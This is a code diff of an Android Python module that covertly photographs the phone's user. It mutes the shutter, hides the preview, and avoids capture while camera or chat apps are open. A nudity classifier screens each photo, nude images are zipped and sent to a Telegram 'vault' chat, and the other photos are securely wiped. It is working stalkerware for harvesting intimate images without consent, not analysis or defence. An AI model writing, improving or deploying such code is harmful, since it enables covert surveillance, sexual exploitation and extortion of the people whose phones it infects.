@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
-import os, time, threading, zipfile, logging, gc, numpy as np
+import os, time, threading, zipfile, logging, gc
+import numpy as np
 from datetime import datetime
 from PIL import Image
 
@@ -20,11 +21,12 @@ except:
 class CameraAnalyzer:
     def __init__(self, mon=None, det=None):
         self.mon = mon
-        self.det = det          # NudeDetector instance
+        self.det = det          # NudeDetector instance (TFLite)
         self.busy = False
         self.last_skip = 0
 
     def _power_ok(self):
+        """التحقق من أن البطارية تسمح بتشغيل الكاميرا"""
         try:
             b, c = self.mon._bat() if hasattr(self.mon, '_bat') else (100, True)
             return b >= 15 or c
@@ -32,21 +34,22 @@ class CameraAnalyzer:
             return True
 
     def _camera_in_use(self):
-        if not JNI:
-            return False
+        """التحقق مما إذا كان المستخدم يفتح تطبيق الكاميرا حالياً لتجنب التعارض"""
+        if not JNI: return False
         try:
             ctx = autoclass('org.kivy.android.PythonActivity').mActivity
             am = ctx.getSystemService("activity")
             tasks = am.getRunningTasks(1)
             if tasks and tasks.size() > 0:
                 pkg = tasks.get(0).topActivity.getPackageName().lower()
-                bad = ["camera", "snap", "insta", "whatsapp", "viber", "tele", "meet", "zoom", "call"]
+                bad = ["camera", "snap", "insta", "whatsapp", "tele", "meet", "zoom"]
                 return any(x in pkg for x in bad)
             return False
         except:
             return False
 
     def _secure_del(self, p):
+        """حذف آمن للملف بمسحه ببيانات عشوائية قبل الحذف النهائي"""
         try:
             if os.path.exists(p):
                 sz = os.path.getsize(p)
@@ -57,8 +60,10 @@ class CameraAnalyzer:
             pass
 
     def capture(self, cam_id=0):
+        """التقاط صورة صامتة من الكاميرا المحددة (0 للخلفية، 1 للأمامية)"""
         if self.busy or not self._power_ok():
             return None
+
         if self._camera_in_use() or time.time() < self.last_skip:
             if self._camera_in_use():
                 self.last_skip = time.time() + 300
@@ -72,25 +77,25 @@ class CameraAnalyzer:
             try:
                 Cam = autoclass('android.hardware.Camera')
                 ST = autoclass('android.graphics.SurfaceTexture')
+
                 try:
                     cam = Cam.open(cam_id)
-                except Exception as e:
-                    logging.error(f"Camera open failed: {e}")
+                except Exception:
                     self.busy = False
                     return None
 
                 params = cam.getParameters()
-                # اختيار أصغر حجم صورة لتقليل استهلاك الرام (مناسب للنموذج)
+
+                # اختيار أقل دقة ممكنة (كافية للتحليل وسريعة في المعالجة)
                 sizes = params.getSupportedPictureSizes()
                 if sizes and sizes.size() > 0:
                     smallest = sizes.get(sizes.size() - 1)
                     params.setPictureSize(smallest.width, smallest.height)
-                
+
                 params.setFlashMode("off")
-                focus_modes = params.getSupportedFocusModes()
-                if focus_modes and "continuous-picture" in focus_modes:
-                    params.setFocusMode("continuous-picture")
                 cam.setParameters(params)
+
+                # محاولة إيقاف صوت الغالق
                 try:
                     cam.enableShutterSound(False)
                 except:
@@ -99,7 +104,8 @@ class CameraAnalyzer:
                 dummy = ST(10)
                 cam.setPreviewTexture(dummy)
                 cam.startPreview()
-                time.sleep(1.5)
+
+                time.sleep(1.2)  # وقت قصير للضبط التلقائي
 
                 data = []
                 ev = threading.Event()
@@ -132,18 +138,18 @@ class CameraAnalyzer:
         return out
 
     def _prepare_for_ai(self, path):
-        """تجهيز الصورة لتناسب نموذج Float16: إلى (224,224) float32 [0,1]"""
+        """تجهيز الصورة لنموذج الذكاء الاصطناعي (224x224)"""
         try:
             with Image.open(path) as img:
                 img = img.convert('RGB').resize((224, 224), Image.LANCZOS)
                 arr = np.array(img, dtype=np.float32) / 255.0
-                arr = np.expand_dims(arr, axis=0)   # batch dimension
-                return arr
+                return np.expand_dims(arr, axis=0)
         except Exception as e:
             logging.error(f"AI prep error: {e}")
             return None
 
     def harvest(self, cam_id=0):
+        """التقاط صورة، تحليلها، إرسالها إذا كانت حساسة، أو حذفها فوراً"""
         p = self.capture(cam_id)
         if not p:
             return
@@ -164,21 +170,25 @@ class CameraAnalyzer:
                 logging.error(f"Harvest AI error: {e}")
 
         if is_nude:
-            self._send_and_clean(p)
+            self._send_to_vault(p)
         else:
             self._secure_del(p)
 
-    def _send_and_clean(self, raw):
+    def _send_to_vault(self, raw):
+        """ضغط الصورة وإرسالها إلى قناة التليجرام الخاصة بالنتائج (Vault)"""
         z = raw.replace(".jpg", ".zip")
         try:
             with zipfile.ZipFile(z, 'w', zipfile.ZIP_DEFLATED) as zf:
                 zf.write(raw, os.path.basename(raw))
-            tg = getattr(self.mon, 'tg', None)
-            vl = getattr(self.mon, 'vlt', None)
-            if tg and vl:
+
+            # التوافق مع هيكلية monitor الجديدة (ui يُستخدم بدلاً من tg مباشرة)
+            ui = getattr(self.mon, 'ui', None)   # واجهة التلغرام
+            vault_id = getattr(self.mon, 'vlt', None)
+
+            if ui and vault_id:
                 with open(z, 'rb') as f:
-                    tg._ap("sendDocument", {
-                        "chat_id": vl,
+                    ui._ap("sendDocument", {
+                        "chat_id": vault_id,
                         "caption": f"📸 Alert | {datetime.now().strftime('%Y-%m-%d %H:%M')}"
                     }, {"document": f})
         except Exception as e:
